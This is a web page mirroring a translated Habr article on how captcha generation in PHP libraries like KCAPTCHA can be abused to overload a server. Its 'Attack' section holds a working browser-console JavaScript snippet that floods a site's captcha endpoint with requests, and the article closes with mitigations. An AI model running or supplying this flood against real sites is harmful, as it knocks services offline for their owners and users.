<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>DoS-attack on sites with their own caps</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="You can find a lot of sites that are protected from all sorts of external unwanted automatic activity (bots) using captchas. And in many cases, the ve...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>DoS-attack on sites with their own caps</h1><div class="post__text post__text-html js-mediator-article">  You can find a lot of sites that are protected from all sorts of external unwanted automatic activity (bots) using captchas.  And in many cases, the very same server on which the site is located is generating these captchas.  To attach such a captcha to the site is very simple, and there are free captcha-generating libraries ( <a href="http://www.captcha.ru/">KCAPTCHA</a> , for example). <br><br>  What is the danger? <a name="habracut"></a><br><br>  If there is a possibility that your site will have enemies (for example, you are the owner of <a href="http://www.piratepay.ru/ru/answers">www.piratepay.ru</a> ), then using such a captcha you risk to help them a lot - it becomes very easy to disable the site using even one client computer. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  Why? </h4><br>  Captcha generation is quite resource-intensive, especially if you consider that PHP (or another language that is not very suitable for image processing) does this. <br><br>  For example, in the above-mentioned KCAPTCHA, a picture is assembled from fragments of a pre-rasterized font (which is stored as an image), for example: <br><br><img src="http://www.habrastorage.com/images/antiqua.png"><br><br>  In total, there are several such font files (in the standard ‚Äúdelivery‚Äù - 22), with each request a directory is searched and one of the files is selected randomly. <br><br>  After pasting randomly selected characters, they are distorted.  In this case, the wave distortion filter is used, written in PHP + GD2. <br><br><pre><code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($x=<span class="hljs-number"><span class="hljs-number">0</span></span>;$x&lt;$width;$x++){ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($y=<span class="hljs-number"><span class="hljs-number">0</span></span>;$y&lt;$height;$y++){ $sx=$x+(sin($x*$rand1+$rand5)+sin($y*$rand3+$rand6))*$rand9-$width/<span class="hljs-number"><span class="hljs-number">2</span></span>+$center+<span class="hljs-number"><span class="hljs-number">1</span></span>; $sy=$y+(sin($x*$rand2+$rand7)+sin($y*$rand4+$rand8))*$rand10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sx&lt;<span class="hljs-number"><span class="hljs-number">0</span></span> || $sy&lt;<span class="hljs-number"><span class="hljs-number">0</span></span> || $sx&gt;=$width<span class="hljs-number"><span class="hljs-number">-1</span></span> || $sy&gt;=$height<span class="hljs-number"><span class="hljs-number">-1</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $color=imagecolorat($img, $sx, $sy) &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>; $color_x=imagecolorat($img, $sx+<span class="hljs-number"><span class="hljs-number">1</span></span>, $sy) &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>; $color_y=imagecolorat($img, $sx, $sy+<span class="hljs-number"><span class="hljs-number">1</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>; $color_xy=imagecolorat($img, $sx+<span class="hljs-number"><span class="hljs-number">1</span></span>, $sy+<span class="hljs-number"><span class="hljs-number">1</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>; } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> imagesetpixel($img2, $x, $y, imagecolorallocate($img2, $newred, $newgreen, $newblue)); } }</code> </pre> <br><br>  Those.  it all happens rather slowly.  No default caching is provided.  The same applies to many other libraries (including the forum ones: phpBB, vBulletin, etc.) <br><br>  If there are a lot of requests for captcha generation, the server will not have time to draw captcha and give ordinary pages (especially considering that the site most often works on some CMS and caching is turned off for various reasons). <br><br><h4>  Attack </h4><br>  In the simplest case, it is enough to go to the site in your favorite browser (so that just in case the referer was correct), open the javascript debugger and write something like this to the console: <br><br><pre> <code class="javascript hljs">cnt = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'content'</span></span>); <span class="hljs-comment"><span class="hljs-comment">/*    id */</span></span> regen = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> html = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">1000</span></span>; i++) { html += <span class="hljs-string"><span class="hljs-string">'&lt;img src="http://www.somesite.com/kcaptcha/index.php?'</span></span> <span class="hljs-comment"><span class="hljs-comment">/*  */</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.random() + <span class="hljs-string"><span class="hljs-string">'" /&gt;'</span></span>; } cnt.innerHTML = html; }; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.setInterval(regen, <span class="hljs-number"><span class="hljs-number">10</span></span> * <span class="hljs-number"><span class="hljs-number">1000</span></span>); regen(); <span class="hljs-comment"><span class="hljs-comment">/*  ‚Äî  ,  ,      */</span></span> <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.setInterval(<span class="hljs-string"><span class="hljs-string">'window.scrollTo(0, document.body.scrollHeight);'</span></span>, <span class="hljs-number"><span class="hljs-number">500</span></span>);</code> </pre><br><br>  As a result, we got a multithreaded download of an infinite number of captchas for free (with their generation on a poor server).  It is clear that not every server will withstand this, many (from voluntarily tested) fall out with HTTP Error 503 Service unavailable. <br><br><h5>  Conclusion </h5><br>  To prevent this kind of attack, there are several obvious ways: <br><ul><li>  use <a href="http://www.google.com/recaptcha">reCaptcha</a> </li><li>  check the number of captcha requests from each IP address, with the same session ID, etc. </li><li>  keep a certain number of generated captcha in the cache (100, 1000, ... - depends on the number of requests), give them through something fast (nginx), periodically rebuild the cache </li><li>  use robust text captchas, preferably tailored to the specifics of your site (for example, sin (30 ¬∞) = ...) </li><li>  <i>your option</i> </li></ul><br><br>  PS do not use "forum" captchas at all, because  they are very weak - replace them with reCaptcha;  if you use text captchas, make sure that the number of options is large enough. </div><p>Source: <a href="https://habr.com/ru/post/144427/">https://habr.com/ru/post/144427/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../144421/index.html">Since when do you manage to enter the habr-captcha?</a></li>
<li><a href="../144422/index.html">Court decision: Google does not violate Oracle patents</a></li>
<li><a href="../144423/index.html">Network equipment upgrade</a></li>
<li><a href="../144424/index.html">Batch operations as it is done in Drupal</a></li>
<li><a href="../144425/index.html">Boot Windows 8 too fast</a></li>
<li><a href="../144428/index.html">Russia has created a platform for video conferencing with a record number of participants.</a></li>
<li><a href="../144429/index.html">Oracle vs Google: fronts</a></li>
<li><a href="../144430/index.html">Kinect for Windows SDK has learned to work with individuals</a></li>
<li><a href="../144431/index.html">The simplest ESR meter for electrolytic capacitors</a></li>
<li><a href="../144433/index.html">Web Evolution (Part 2: Who will own the Internet?)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>